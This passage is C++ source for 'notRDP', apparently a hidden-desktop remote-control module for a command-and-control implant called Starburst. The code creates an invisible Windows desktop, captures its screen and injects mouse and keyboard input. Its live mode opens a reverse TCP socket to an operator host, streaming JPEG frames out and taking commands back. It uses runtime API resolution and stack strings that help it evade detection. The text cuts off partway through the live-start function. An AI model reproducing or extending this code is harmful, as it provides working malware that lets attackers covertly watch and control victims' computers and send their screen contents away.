/*
 * notRDP for Starburst — Invisible alternate Windows desktop with
 * screen capture and interactive mouse/keyboard input.
 *
 * Based on dagowda/notRDP (MIT License) — adapted for
 * Starburst's PIC C++ conventions (no CRT, symbol<> strings,
 * runtime API resolution via LoadLibraryA/GetProcAddress).
 *
 * Operations:
 *   start  — create hidden desktop, launch explorer.exe on it
 *   shot   — capture a BMP screenshot through Mythic
 *   input  — inject mouse/keyboard input (PostMessage-based)
 *   live   — stream JPEG frames and input over a reverse TCP connection
 *   stop   — teardown
 */

#include <commands.h>
#include <common.h>
#include <config.h>
#include <package.h>
#include <parser.h>
#include <stackstr.h>
#include <strings.h>

#ifdef INCLUDE_CMD_NOTRDP

using namespace stardust;
using namespace starburst;

#define NR_DESKTOP_NAME L"StarburstHidden"
#define NR_SEC_DESCRIPTOR 1
#define NR_DACL_INFO 4
#define NR_DESKTOP_ALL 0x000001FF
#define NR_DESKTOP_READOBJECTS 0x00000001
#define NR_DESKTOP_WRITEOBJECTS 0x00000080
#define NR_DESKTOP_SWITCHDESKTOP 0x00000100
#define NR_GENERIC_READ 0x20000
#define NR_WRITE_DAC 0x40000
#define NR_CREATE_NEW_CONSOLE 0x10
#define NR_SM_CXSCREEN 0
#define NR_SM_CYSCREEN 1
#define NR_SRCCOPY 0x00CC0020
#define NR_SWITCH_BLIP_MS 700

/* live streaming protocol (operator -> agent = "NRDP1" reverse socket) */
#define NR_LIVE_MSG_FRAME 0x01 /* agent -> operator: jpeg frame */
#define NR_LIVE_MSG_INPUT 0x02 /* operator -> agent: mouse/key event */
#define NR_LIVE_QUALITY 40     /* GDI+ JPEG quality */
#define NR_LIVE_INVALID (~(uintptr_t)0)
#define NR_LIVE_INPUT_MSG 9 /* type(1) + x(2) + y(2) + action(2) + key(2) */

/* EncoderQuality GUID 1D5BE4B5-FA4A-452D-9CDD-5DB3510557EF */
static const uint8_t NR_GUID_ENCODER_QUALITY[16] = {
    0xB5, 0xE4, 0x5B, 0x1D, 0x4A, 0xFA, 0x2D, 0x45,
    0x9C, 0xDD, 0x5D, 0xB3, 0x51, 0x05, 0x57, 0xEF};
/* JPEG encoder CLSID 557CF401-1A04-11D3-9A73-0000F81EF32E */
static const uint8_t NR_GUID_JPEG_ENCODER[16] = {
    0x01, 0xF4, 0x7C, 0x55, 0x04, 0x1A, 0xD3, 0x11,
    0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E};

/* WM messages for PostMessage */
#define NR_WM_MOUSEMOVE 0x0200
#define NR_WM_LBUTTONDOWN 0x0201
#define NR_WM_LBUTTONUP 0x0202
#define NR_WM_LBUTTONDBLCLK 0x0203
#define NR_WM_RBUTTONDOWN 0x0204
#define NR_WM_RBUTTONUP 0x0205
#define NR_WM_KEYDOWN 0x0100
#define NR_WM_MOUSEWHEEL 0x020A
#define NR_WM_KEYUP 0x0101
#define NR_MK_LBUTTON 0x0001
#define NR_MK_RBUTTON 0x0002
#define NR_CWP_SKIPINVISIBLE 0x0001
#define NR_CWP_SKIPDISABLED 0x0002
#define NR_CWP_SKIPTRANSPARENT 0x0004

/* Bitmap header sizes */
#define NR_BITMAPFILEHEADER_SIZE 14
#define NR_BITMAPINFOHEADER_SIZE 40

struct NotRdpState {
  HANDLE h_desktop;
  HANDLE h_explorer_proc;
  HANDLE h_shell_proc;
  uint32_t explorer_pid;
  uint32_t shell_pid;
  bool active;
  /* live streaming */
  HANDLE live_thread;
  uintptr_t live_sock;        /* uintptr_t SOCKET, NR_INVALID_SOCKET when off */
  volatile long live_running; /* InterlockedExchange target */
  uint32_t live_fps;
  uint32_t live_scale;
  uint32_t live_w; /* screen dims at live start */
  uint32_t live_h;
  /* live capture APIs are thread-local; only control state is shared */
};

struct NrPoint {
  int32_t x;
  int32_t y;
};

/* Function typedefs — all resolved at runtime via GetProcAddress */
typedef void *(WINAPI *fn_CreateDesktopW)(const wchar_t *, const wchar_t *,
                                          void *, uint32_t, uint32_t, void *);
typedef void *(WINAPI *fn_OpenDesktopW)(const wchar_t *, uint32_t, int,
                                        uint32_t);
typedef int(WINAPI *fn_CloseDesktop)(void *);
typedef int(WINAPI *fn_SetThreadDesktop)(void *);
typedef void *(WINAPI *fn_GetThreadDesktop)(uint32_t);
typedef int(WINAPI *fn_SwitchDesktop)(void *);
typedef uint32_t(WINAPI *fn_GetCurrentThreadId)(void);
typedef int(WINAPI *fn_InitializeSecurityDescriptor)(void *, uint32_t);
typedef int(WINAPI *fn_SetSecurityDescriptorDacl)(void *, int, void *, int);
typedef BOOL(WINAPI *fn_CreateProcessW)(const wchar_t *, wchar_t *, void *,
                                        void *, int, uint32_t, void *,
                                        const wchar_t *, void *, void *);
typedef int(WINAPI *fn_TerminateProcess)(void *, uint32_t);
typedef int(WINAPI *fn_MultiByteToWideChar)(uint32_t, uint32_t, const char *,
                                            int, wchar_t *, int);
typedef HDC(WINAPI *fn_GetDC)(void *);
typedef int(WINAPI *fn_ReleaseDC)(void *, HDC);
typedef int(WINAPI *fn_GetSystemMetrics)(int);
typedef HDC(WINAPI *fn_CreateCompatibleDC)(HDC);
typedef HGDIOBJ(WINAPI *fn_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ(WINAPI *fn_SelectObject)(HDC, HGDIOBJ);
typedef int(WINAPI *fn_BitBlt)(HDC, int, int, int, int, HDC, int, int,
                               uint32_t);
typedef int(WINAPI *fn_GetDIBits)(HDC, HGDIOBJ, uint32_t, uint32_t, void *,
                                  void *, uint32_t);
typedef int(WINAPI *fn_DeleteObject)(void *);
typedef int(WINAPI *fn_DeleteDC)(HDC);
typedef BOOL(WINAPI *fn_PostMessageW)(void *, uint32_t, uintptr_t, intptr_t);
typedef void *(WINAPI *fn_WindowFromPoint)(NrPoint);
typedef int(WINAPI *fn_ScreenToClient)(void *, void *);
typedef void *(WINAPI *fn_ChildWindowFromPointEx)(void *, NrPoint, uint32_t);
typedef uint32_t(WINAPI *fn_GetWindowThreadProcessId)(void *, uint32_t *);
typedef int(WINAPI *fn_AttachThreadInput)(uint32_t, uint32_t, int);
typedef void *(WINAPI *fn_SetFocus)(void *);
typedef uint32_t(WINAPI *fn_MapVirtualKeyA)(uint32_t, uint32_t);

/* live streaming: winsock */
typedef int(WINAPI *nr_fn_WSAStartup)(uint16_t, void *);
typedef int(WINAPI *nr_fn_WSACleanup)(void);
typedef uintptr_t(WINAPI *nr_fn_socket)(int, int, int);
typedef int(WINAPI *nr_fn_connect)(uintptr_t, const void *, int);
typedef int(WINAPI *nr_fn_send)(uintptr_t, const char *, int, int);
typedef int(WINAPI *nr_fn_recv)(uintptr_t, char *, int, int);
typedef int(WINAPI *nr_fn_closesocket)(uintptr_t);
typedef int(WINAPI *nr_fn_select)(int, void *, void *, void *, const void *);
typedef uint16_t(WINAPI *nr_fn_htons)(uint16_t);
typedef unsigned long(WINAPI *nr_fn_inet_addr)(const char *);
/* live streaming: gdi32 */
typedef int(WINAPI *nr_fn_SetStretchBltMode)(HDC, int);
typedef int(WINAPI *nr_fn_StretchBlt)(HDC, int, int, int, int, HDC, int, int,
                                      int, int, uint32_t);
/* live streaming: gdiplus + ole32 */
typedef long(WINAPI *nr_fn_GdiplusStartup)(void *, void *, void *);
typedef void(WINAPI *nr_fn_GdiplusShutdown)(void *);
typedef long(WINAPI *nr_fn_GdipCreateBitmapFromHBITMAP)(void *, void *,
                                                        void **);
typedef long(WINAPI *nr_fn_GdipSaveImageToStream)(void *, void *, const void *,
                                                  void *);
typedef long(WINAPI *nr_fn_GdipDisposeImage)(void *);
typedef long(WINAPI *nr_fn_CreateStreamOnHGlobal)(void *, int, void **);
typedef long(WINAPI *nr_fn_GetHGlobalFromStream)(void *, void **);
typedef long(WINAPI *nr_fn_ComRelease)(void *);
typedef void *(WINAPI *nr_fn_GlobalLock)(void *);
typedef int(WINAPI *nr_fn_GlobalUnlock)(void *);
/* live streaming: IStream::Stat for exact encoded size */
typedef long(WINAPI *nr_fn_StreamStat)(void *, void *, uint32_t);

#pragma pack(push, 1)
struct NR_BITMAPINFOHEADER {
  uint32_t biSize;
  int32_t biWidth;
  int32_t biHeight;
  uint16_t biPlanes;
  uint16_t biBitCount;
  uint16_t biCompression;
  uint32_t biSizeImage;
  int32_t biXPelsPerMeter;
  int32_t biYPelsPerMeter;
  uint32_t biClrUsed;
  uint32_t biClrImportant;
};
#pragma pack(pop)

/* ── helper: to_wide ── */
static auto declfn nr_to_wide(instance &inst, const char *s, wchar_t *out,
                              int out_cap) -> void {
  inst.kernel32.MultiByteToWideChar(65001, 0, s, -1, out, out_cap);
}

/* ── live streaming: reverse-socket browser mode ──
 *
 * The worker connects to the operator, activates the hidden desktop for
 * the duration of the session, captures it with BitBlt, and encodes JPEG
 * frames with GDI+. Input messages travel back over the same socket. */

struct NrLiveCtx {
  instance *inst;
  NotRdpState *state;
  char host[64];
  uint32_t port;
};

struct NrCaptureApis {
  fn_GetDC get_dc;
  fn_ReleaseDC release_dc;
  fn_SetThreadDesktop set_thread_desktop;
  fn_SwitchDesktop switch_desktop;
  fn_GetThreadDesktop get_thread_desktop;
  fn_GetCurrentThreadId get_current_thread_id;
  fn_CreateCompatibleDC create_compatible_dc;
  fn_CreateCompatibleBitmap create_compatible_bitmap;
  fn_SelectObject select_object;
  fn_BitBlt bit_blt;
  fn_DeleteObject delete_object;
  fn_DeleteDC delete_dc;
  nr_fn_SetStretchBltMode set_stretch_mode;
  nr_fn_StretchBlt stretch_blt;
  nr_fn_GdiplusStartup gdiplus_startup;
  nr_fn_GdiplusShutdown gdiplus_shutdown;
  nr_fn_GdipCreateBitmapFromHBITMAP create_gdip_bitmap;
  nr_fn_GdipSaveImageToStream save_jpeg;
  nr_fn_GdipDisposeImage dispose_image;
  nr_fn_CreateStreamOnHGlobal create_stream;
  nr_fn_GetHGlobalFromStream get_stream_hglobal;
  nr_fn_GlobalLock global_lock;
  nr_fn_GlobalUnlock global_unlock;
  void *gdiplus_token;
};

struct NrInputApis {
  fn_SetThreadDesktop set_thread_desktop;
  fn_GetThreadDesktop get_thread_desktop;
  fn_GetCurrentThreadId get_current_thread_id;
  fn_PostMessageW post_message;
  fn_WindowFromPoint window_from_point;
  fn_ScreenToClient screen_to_client;
  fn_ChildWindowFromPointEx child_from_point;
  fn_GetWindowThreadProcessId get_window_thread;
  fn_AttachThreadInput attach_thread_input;
  fn_SetFocus set_focus;
  fn_MapVirtualKeyA map_virtual_key;
};

struct NrFdSet {
  uint32_t count;
  uintptr_t sock[1];
};

struct NrTimeval {
  int32_t sec;
  int32_t usec;
};

static auto declfn nr_init_input_apis(instance &inst, NrInputApis *apis)
    -> bool;
static auto declfn nr_input_resolved(NotRdpState *state, NrInputApis *apis,
                                     int32_t x, int32_t y, int32_t action,
                                     int32_t key) -> void;
static auto declfn nr_input(instance &inst, NotRdpState *state, int32_t x,
                            int32_t y, int32_t action, int32_t key) -> void;

static auto declfn nr_send_all(nr_fn_send send_fn, uintptr_t sock,
                               const uint8_t *buf, uint32_t len) -> bool {
  uint32_t off = 0;
  while (off < len) {
    int n = send_fn(sock, reinterpret_cast<const char *>(buf + off),
                    static_cast<int>(len - off), 0);
    if (n <= 0)
      return false;
    off += static_cast<uint32_t>(n);
  }
  return true;
}

static auto declfn nr_init_capture_apis(instance &inst, NrCaptureApis *apis)
    -> bool {
  memory::zero(apis, sizeof(NrCaptureApis));

  STK_USER32(_u32);
  STK_GDI32(_g32);
  STK_OLE32(_ole);
  char gdiplus_s[] = {'g', 'd', 'i', 'p', 'l', 'u', 's', '.', 'd', 'l', 'l', 0};

  auto h_user32 = inst.kernel32.LoadLibraryA(_u32);
  auto h_gdi32 = inst.kernel32.LoadLibraryA(_g32);
  auto h_ole32 = inst.kernel32.LoadLibraryA(_ole);
  auto h_gdiplus = inst.kernel32.LoadLibraryA(gdiplus_s);
  if (!h_user32 || !h_gdi32 || !h_ole32 || !h_gdiplus)
    return false;

  auto gpa = inst.kernel32.GetProcAddress;
  auto u32m = reinterpret_cast<HMODULE>(h_user32);
  auto g32m = reinterpret_cast<HMODULE>(h_gdi32);
  auto olem = reinterpret_cast<HMODULE>(h_ole32);
  auto gpm = reinterpret_cast<HMODULE>(h_gdiplus);
  auto k32m = reinterpret_cast<HMODULE>(inst.kernel32.handle);

  apis->get_dc = reinterpret_cast<fn_GetDC>(gpa(u32m, symbol<LPCSTR>("GetDC")));
  apis->release_dc =
      reinterpret_cast<fn_ReleaseDC>(gpa(u32m, symbol<LPCSTR>("ReleaseDC")));
  apis->set_thread_desktop = reinterpret_cast<fn_SetThreadDesktop>(
      gpa(u32m, symbol<LPCSTR>("SetThreadDesktop")));
  apis->switch_desktop = reinterpret_cast<fn_SwitchDesktop>(
      gpa(u32m, symbol<LPCSTR>("SwitchDesktop")));
  apis->get_thread_desktop = reinterpret_cast<fn_GetThreadDesktop>(
      gpa(u32m, symbol<LPCSTR>("GetThreadDesktop")));
  apis->get_current_thread_id = reinterpret_cast<fn_GetCurrentThreadId>(
      gpa(k32m, symbol<LPCSTR>("GetCurrentThreadId")));
  apis->create_compatible_dc = reinterpret_cast<fn_CreateCompatibleDC>(
      gpa(g32m, symbol<LPCSTR>("CreateCompatibleDC")));
  apis->create_compatible_bitmap = reinterpret_cast<fn_CreateCompatibleBitmap>(
      gpa(g32m, symbol<LPCSTR>("CreateCompatibleBitmap")));
  apis->select_object = reinterpret_cast<fn_SelectObject>(
      gpa(g32m, symbol<LPCSTR>("SelectObject")));
  apis->bit_blt =
      reinterpret_cast<fn_BitBlt>(gpa(g32m, symbol<LPCSTR>("BitBlt")));
  apis->delete_object = reinterpret_cast<fn_DeleteObject>(
      gpa(g32m, symbol<LPCSTR>("DeleteObject")));
  apis->delete_dc =
      reinterpret_cast<fn_DeleteDC>(gpa(g32m, symbol<LPCSTR>("DeleteDC")));
  apis->set_stretch_mode = reinterpret_cast<nr_fn_SetStretchBltMode>(
      gpa(g32m, symbol<LPCSTR>("SetStretchBltMode")));
  apis->stretch_blt = reinterpret_cast<nr_fn_StretchBlt>(
      gpa(g32m, symbol<LPCSTR>("StretchBlt")));
  apis->gdiplus_startup = reinterpret_cast<nr_fn_GdiplusStartup>(
      gpa(gpm, symbol<LPCSTR>("GdiplusStartup")));
  apis->gdiplus_shutdown = reinterpret_cast<nr_fn_GdiplusShutdown>(
      gpa(gpm, symbol<LPCSTR>("GdiplusShutdown")));
  apis->create_gdip_bitmap =
      reinterpret_cast<nr_fn_GdipCreateBitmapFromHBITMAP>(
          gpa(gpm, symbol<LPCSTR>("GdipCreateBitmapFromHBITMAP")));
  apis->save_jpeg = reinterpret_cast<nr_fn_GdipSaveImageToStream>(
      gpa(gpm, symbol<LPCSTR>("GdipSaveImageToStream")));
  apis->dispose_image = reinterpret_cast<nr_fn_GdipDisposeImage>(
      gpa(gpm, symbol<LPCSTR>("GdipDisposeImage")));
  apis->create_stream = reinterpret_cast<nr_fn_CreateStreamOnHGlobal>(
      gpa(olem, symbol<LPCSTR>("CreateStreamOnHGlobal")));
  apis->get_stream_hglobal = reinterpret_cast<nr_fn_GetHGlobalFromStream>(
      gpa(olem, symbol<LPCSTR>("GetHGlobalFromStream")));
  apis->global_lock = reinterpret_cast<nr_fn_GlobalLock>(
      gpa(k32m, symbol<LPCSTR>("GlobalLock")));
  apis->global_unlock = reinterpret_cast<nr_fn_GlobalUnlock>(
      gpa(k32m, symbol<LPCSTR>("GlobalUnlock")));

  const void *required[23] = {
      (const void *)apis->get_dc,
      (const void *)apis->release_dc,
      (const void *)apis->set_thread_desktop,
      (const void *)apis->switch_desktop,
      (const void *)apis->get_thread_desktop,
      (const void *)apis->get_current_thread_id,
      (const void *)apis->create_compatible_dc,
      (const void *)apis->create_compatible_bitmap,
      (const void *)apis->select_object,
      (const void *)apis->bit_blt,
      (const void *)apis->delete_object,
      (const void *)apis->delete_dc,
      (const void *)apis->set_stretch_mode,
      (const void *)apis->stretch_blt,
      (const void *)apis->gdiplus_startup,
      (const void *)apis->gdiplus_shutdown,
      (const void *)apis->create_gdip_bitmap,
      (const void *)apis->save_jpeg,
      (const void *)apis->dispose_image,
      (const void *)apis->create_stream,
      (const void *)apis->get_stream_hglobal,
      (const void *)apis->global_lock,
      (const void *)apis->global_unlock,
  };
  for (uint32_t i = 0; i < 23; i++) {
    if (!required[i])
      return false;
  }

  uint8_t startup_input[32] = {};
  *(uint32_t *)startup_input = 1; /* GdiplusVersion */
  if (apis->gdiplus_startup(&apis->gdiplus_token, startup_input, nullptr) != 0)
    return false;
  return apis->gdiplus_token != nullptr;
}

/* The worker has already made the hidden desktop active. Capture one frame
 * as an in-memory JPEG; ownership of the returned buffer passes to caller. */
static auto declfn nr_capture_jpeg(instance &inst, NotRdpState *state,
                                   NrCaptureApis *apis, uint8_t **out_buf,
                                   uint32_t *out_len) -> bool {
  *out_buf = nullptr;
  *out_len = 0;

  int32_t width = static_cast<int32_t>(state->live_w);
  int32_t height = static_cast<int32_t>(state->live_h);
  if (width <= 0 || height <= 0)
    return false;

  HDC screen_dc = apis->get_dc(nullptr);
  if (!screen_dc)
    return false;

  HDC full_dc = apis->create_compatible_dc(screen_dc);
  HGDIOBJ full_bmp = nullptr;
  HGDIOBJ full_old = nullptr;
  bool captured = false;
  if (full_dc) {
    full_bmp = apis->create_compatible_bitmap(screen_dc, width, height);
    if (full_bmp) {
      full_old = apis->select_object(full_dc, full_bmp);
      captured = apis->bit_blt(full_dc, 0, 0, width, height, screen_dc, 0, 0,
                               NR_SRCCOPY) != 0;
    }
  }
  apis->release_dc(nullptr, screen_dc);

  if (!captured) {
    if (full_bmp) {
      apis->select_object(full_dc, full_old);
      apis->delete_object(full_bmp);
    }
    if (full_dc)
      apis->delete_dc(full_dc);
    return false;
  }

  HGDIOBJ out_bmp = full_bmp;
  HDC small_dc = nullptr;
  HGDIOBJ small_bmp = nullptr;
  HGDIOBJ small_old = nullptr;
  uint32_t scale = state->live_scale;
  if (scale > 1) {
    int32_t out_width = width / static_cast<int32_t>(scale);
    int32_t out_height = height / static_cast<int32_t>(scale);
    small_dc = apis->create_compatible_dc(full_dc);
    if (small_dc)
      small_bmp =
          apis->create_compatible_bitmap(full_dc, out_width, out_height);
    if (small_dc && small_bmp) {
      small_old = apis->select_object(small_dc, small_bmp);
      apis->set_stretch_mode(small_dc, 3 /* COLORONCOLOR */);
      if (apis->stretch_blt(small_dc, 0, 0, out_width, out_height, full_dc, 0,
                            0, width, height, NR_SRCCOPY))
        out_bmp = small_bmp;
    }
  }

  bool ok = false;
  void *image = nullptr;
  void *stream = nullptr;
  void *hglobal = nullptr;
  void *locked = nullptr;
  do {
    if (apis->create_gdip_bitmap(out_bmp, nullptr, &image) != 0 || !image)
      break;
    if (apis->create_stream(nullptr, 1, &stream) != 0 || !stream)
      break;

    /* EncoderParameters x64 layout: Count@0, pad to 8, then
     * EncoderParameter { GUID@8, NumberOfValues@24, Type@28,
     * Value pointer@32 }. */
    uint8_t encoder_params[40] = {};
    *(uint32_t *)encoder_params = 1;
    memory::copy(encoder_params + 8,
                 const_cast<uint8_t *>(NR_GUID_ENCODER_QUALITY), 16);
    *(uint32_t *)(encoder_params + 24) = 1;
    *(uint32_t *)(encoder_params + 28) = 4;
    uint32_t quality = NR_LIVE_QUALITY;
    *(uintptr_t *)(encoder_params + 32) = (uintptr_t)&quality;

    if (apis->save_jpeg(image, stream, NR_GUID_JPEG_ENCODER, encoder_params) !=
        0)
      break;
    if (apis->get_stream_hglobal(stream, &hglobal) != 0 || !hglobal)
      break;

    /* IStream::Stat is vtable slot 12. STATSTG.cbSize starts at offset 16. */
    uint8_t stat_buf[80] = {};
    void **vtable = *reinterpret_cast<void ***>(stream);
    nr_fn_StreamStat stream_stat =
        reinterpret_cast<nr_fn_StreamStat>(vtable[12]);
    if (!stream_stat || stream_stat(stream, stat_buf, 0) != 0)
      break;
    uint64_t jpeg_len = *(uint64_t *)(stat_buf + 16);
    if (jpeg_len == 0 || jpeg_len > (64u << 20))
      break;

    locked = apis->global_lock(hglobal);
    if (!locked)
      break;
    auto jpeg = static_cast<uint8_t *>(
        inst.heap_alloc(static_cast<uint32_t>(jpeg_len)));
    if (!jpeg)
      break;
    memory::copy(jpeg, locked, static_cast<uint32_t>(jpeg_len));

    *out_buf = jpeg;
    *out_len = static_cast<uint32_t>(jpeg_len);
    ok = true;
  } while (0);

  if (locked)
    apis->global_unlock(hglobal);
  if (stream) {
    void **vtable = *reinterpret_cast<void ***>(stream);
    nr_fn_ComRelease release_stream =
        reinterpret_cast<nr_fn_ComRelease>(vtable[2]);
    if (release_stream)
      release_stream(stream);
  }
  if (image)
    apis->dispose_image(image);

  if (small_dc) {
    if (small_bmp) {
      apis->select_object(small_dc, small_old);
      apis->delete_object(small_bmp);
    }
    apis->delete_dc(small_dc);
  }
  apis->select_object(full_dc, full_old);
  apis->delete_object(full_bmp);
  apis->delete_dc(full_dc);
  return ok;
}

static auto declfn nr_live_stop(instance &inst, NotRdpState *state) -> void {
  if (!state->live_running && state->live_sock == NR_LIVE_INVALID &&
      !state->live_thread)
    return;

  InterlockedExchange(&state->live_running, 0);

  uintptr_t sock = state->live_sock;
  state->live_sock = NR_LIVE_INVALID;
  if (sock != NR_LIVE_INVALID) {
    STK_WS2_32(_ws2s);
    auto h_ws2 = inst.kernel32.LoadLibraryA(_ws2s);
    if (h_ws2) {
      auto close_socket =
          reinterpret_cast<nr_fn_closesocket>(inst.kernel32.GetProcAddress(
              reinterpret_cast<HMODULE>(h_ws2), symbol<LPCSTR>("closesocket")));
      if (close_socket)
        close_socket(sock);
    }
  }

  if (state->live_thread) {
    inst.kernel32.WaitForSingleObject(state->live_thread, 0xFFFFFFFF);
    inst.kernel32.CloseHandle(state->live_thread);
    state->live_thread = nullptr;
  }
}

static uint32_t WINAPI nr_live_thread(void *pv) {
  NrLiveCtx *ctx = static_cast<NrLiveCtx *>(pv);
  instance &inst = *ctx->inst;
  NotRdpState *state = ctx->state;

  STK_WS2_32(_ws2);
  auto h_ws2 = inst.kernel32.LoadLibraryA(_ws2);
  auto gpa = inst.kernel32.GetProcAddress;
  auto ws2m = reinterpret_cast<HMODULE>(h_ws2);

  nr_fn_WSAStartup wsa_startup =
      h_ws2 ? reinterpret_cast<nr_fn_WSAStartup>(
                  gpa(ws2m, symbol<LPCSTR>("WSAStartup")))
            : nullptr;
  nr_fn_WSACleanup wsa_cleanup =
      h_ws2 ? reinterpret_cast<nr_fn_WSACleanup>(
                  gpa(ws2m, symbol<LPCSTR>("WSACleanup")))
            : nullptr;
  nr_fn_socket create_socket =
      h_ws2
          ? reinterpret_cast<nr_fn_socket>(gpa(ws2m, symbol<LPCSTR>("socket")))
          : nullptr;
  nr_fn_connect connect_socket = h_ws2 ? reinterpret_cast<nr_fn_connect>(gpa(
                                             ws2m, symbol<LPCSTR>("connect")))
                                       : nullptr;
  nr_fn_send send_socket =
      h_ws2 ? reinterpret_cast<nr_fn_send>(gpa(ws2m, symbol<LPCSTR>("send")))
            : nullptr;
  nr_fn_recv recv_socket =
      h_ws2 ? reinterpret_cast<nr_fn_recv>(gpa(ws2m, symbol<LPCSTR>("recv")))
            : nullptr;
  nr_fn_closesocket close_socket =
      h_ws2 ? reinterpret_cast<nr_fn_closesocket>(
                  gpa(ws2m, symbol<LPCSTR>("closesocket")))
            : nullptr;
  nr_fn_select select_socket =
      h_ws2
          ? reinterpret_cast<nr_fn_select>(gpa(ws2m, symbol<LPCSTR>("select")))
          : nullptr;
  nr_fn_htons host_to_network_short =
      h_ws2 ? reinterpret_cast<nr_fn_htons>(gpa(ws2m, symbol<LPCSTR>("htons")))
            : nullptr;
  nr_fn_inet_addr parse_ipv4 = h_ws2 ? reinterpret_cast<nr_fn_inet_addr>(gpa(
                                           ws2m, symbol<LPCSTR>("inet_addr")))
                                     : nullptr;

  bool wsa_started = false;
  bool capture_started = false;
  bool thread_on_hidden = false;
  bool hidden_active = false;
  uintptr_t sock = NR_LIVE_INVALID;
  void *original_desktop = nullptr;
  NrCaptureApis capture_apis;
  memory::zero(&capture_apis, sizeof(capture_apis));
  NrInputApis input_apis;
  memory::zero(&input_apis, sizeof(input_apis));

  do {
    const void *socket_apis[10] = {
        (const void *)wsa_startup,           (const void *)wsa_cleanup,
        (const void *)create_socket,         (const void *)connect_socket,
        (const void *)send_socket,           (const void *)recv_socket,
        (const void *)close_socket,          (const void *)select_socket,
        (const void *)host_to_network_short, (const void *)parse_ipv4,
    };
    bool socket_apis_ok = true;
    for (uint32_t i = 0; i < 10; i++) {
      if (!socket_apis[i]) {
        socket_apis_ok = false;
        break;
      }
    }
    if (!socket_apis_ok)
      break;

    uint8_t wsa_data[512] = {};
    if (wsa_startup(0x0202, wsa_data) != 0)
      break;
    wsa_started = true;

    if (!nr_init_capture_apis(inst, &capture_apis))
      break;
    capture_started = true;
    if (!nr_init_input_apis(inst, &input_apis))
      break;

    struct NrSockaddrIn {
      int16_t family;
      uint16_t port;
      uint32_t address;
      uint8_t padding[8];
    };
    NrSockaddrIn address;
    memory::zero(&address, sizeof(address));
    address.family = 2; /* AF_INET */
    address.port = host_to_network_short(static_cast<uint16_t>(ctx->port));
    address.address = parse_ipv4(ctx->host);
    if (address.address == 0xFFFFFFFF)
      break;

    sock = create_socket(2 /* AF_INET */, 1 /* SOCK_STREAM */,
                         6 /* IPPROTO_TCP */);
    if (sock == NR_LIVE_INVALID || sock == 0)
      break;
    state->live_sock = sock;
    if (connect_socket(sock, &address, sizeof(address)) != 0)
      break;

    /* magic(4), version(1), width(4), height(4), scale(1), big-endian */
    uint8_t handshake[14];
    handshake[0] = 'N';
    handshake[1] = 'R';
    handshake[2] = 'D';
    handshake[3] = 'P';
    handshake[4] = 1;
    handshake[5] = static_cast<uint8_t>(state->live_w >> 24);
    handshake[6] = static_cast<uint8_t>(state->live_w >> 16);
    handshake[7] = static_cast<uint8_t>(state->live_w >> 8);
    handshake[8] = static_cast<uint8_t>(state->live_w);
    handshake[9] = static_cast<uint8_t>(state->live_h >> 24);
    handshake[10] = static_cast<uint8_t>(state->live_h >> 16);
    handshake[11] = static_cast<uint8_t>(state->live_h >> 8);
    handshake[12] = static_cast<uint8_t>(state->live_h);
    handshake[13] = static_cast<uint8_t>(state->live_scale);
    if (!nr_send_all(send_socket, sock, handshake, sizeof(handshake)))
      break;

    original_desktop =
        capture_apis.get_thread_desktop(capture_apis.get_current_thread_id());
    if (!original_desktop || !capture_apis.set_thread_desktop(state->h_desktop))
      break;
    thread_on_hidden = true;
    if (!capture_apis.switch_desktop(state->h_desktop))
      break;
    hidden_active = true;
    inst.kernel32.Sleep(NR_SWITCH_BLIP_MS);

    uint8_t input_buffer[64];
    uint32_t input_len = 0;
    while (state->live_running && state->live_sock == sock) {
      NrFdSet read_set;
      read_set.count = 1;
      read_set.sock[0] = sock;
      NrTimeval timeout;
      timeout.sec = 0;
      timeout.usec = 0;
      int selected = select_socket(0, &read_set, nullptr, nullptr, &timeout);
      if (selected < 0)
        break;
      if (selected > 0) {
        uint8_t received[256];
        int received_len = recv_socket(sock, reinterpret_cast<char *>(received),
                                       sizeof(received), 0);
        if (received_len <= 0)
          break;

        for (int i = 0; i < received_len; i++) {
          if (input_len == sizeof(input_buffer))
            input_len = 0;
          input_buffer[input_len++] = received[i];

          while (input_len >= NR_LIVE_INPUT_MSG) {
            if (input_buffer[0] != NR_LIVE_MSG_INPUT) {
              for (uint32_t j = 1; j < input_len; j++)
                input_buffer[j - 1] = input_buffer[j];
              input_len--;
              continue;
            }

            int32_t x =
                static_cast<int16_t>((input_buffer[1] << 8) | input_buffer[2]);
            int32_t y =
                static_cast<int16_t>((input_buffer[3] << 8) | input_buffer[4]);
            int32_t action =
                static_cast<int16_t>((input_buffer[5] << 8) | input_buffer[6]);
            int32_t key =
                static_cast<int16_t>((input_buffer[7] << 8) | input_buffer[8]);
            if (state->active)
              nr_input_resolved(state, &input_apis, x, y, action, key);

            uint32_t remaining = input_len - NR_LIVE_INPUT_MSG;
            for (uint32_t j = 0; j < remaining; j++)
              input_buffer[j] = input_buffer[j + NR_LIVE_INPUT_MSG];
            input_len = remaining;
          }
        }
      }

      uint8_t *jpeg = nullptr;
      uint32_t jpeg_len = 0;
      if (!nr_capture_jpeg(inst, state, &capture_apis, &jpeg, &jpeg_len))
        break;

      uint8_t header[5];
      header[0] = NR_LIVE_MSG_FRAME;
      header[1] = static_cast<uint8_t>(jpeg_len >> 24);
      header[2] = static_cast<uint8_t>(jpeg_len >> 16);
      header[3] = static_cast<uint8_t>(jpeg_len >> 8);
      header[4] = static_cast<uint8_t>(jpeg_len);
      bool sent = nr_send_all(send_socket, sock, header, sizeof(header)) &&
                  nr_send_all(send_socket, sock, jpeg, jpeg_len);
      inst.heap_free(jpeg);
      if (!sent)
        break;

      inst.kernel32.Sleep(1000 / state->live_fps);
    }
  } while (0);

  if (hidden_active && original_desktop)
    capture_apis.switch_desktop(original_desktop);
  if (thread_on_hidden && original_desktop)
    capture_apis.set_thread_desktop(original_desktop);

  if (sock != NR_LIVE_INVALID && state->live_sock == sock) {
    state->live_sock = NR_LIVE_INVALID;
    if (close_socket)
      close_socket(sock);
  }
  if (capture_started)
    capture_apis.gdiplus_shutdown(capture_apis.gdiplus_token);
  if (wsa_started)
    wsa_cleanup();

  InterlockedExchange(&state->live_running, 0);
  inst.heap_free(ctx);
  return 0;
}

static auto declfn nr_live_start(instance &inst, NotRdpState *state,
                                 const char *host, uint32_t port, uint32_t fps,
                                 uint32_t scale) -> bool {
  if (state->live_running || state->live_thread)
    nr_live_stop(inst, state);

  STK_USER32(_u32m);
  auto h_user32 = inst.kernel32.LoadLibraryA(_u32m);
  if (!h_user32)
    return false;
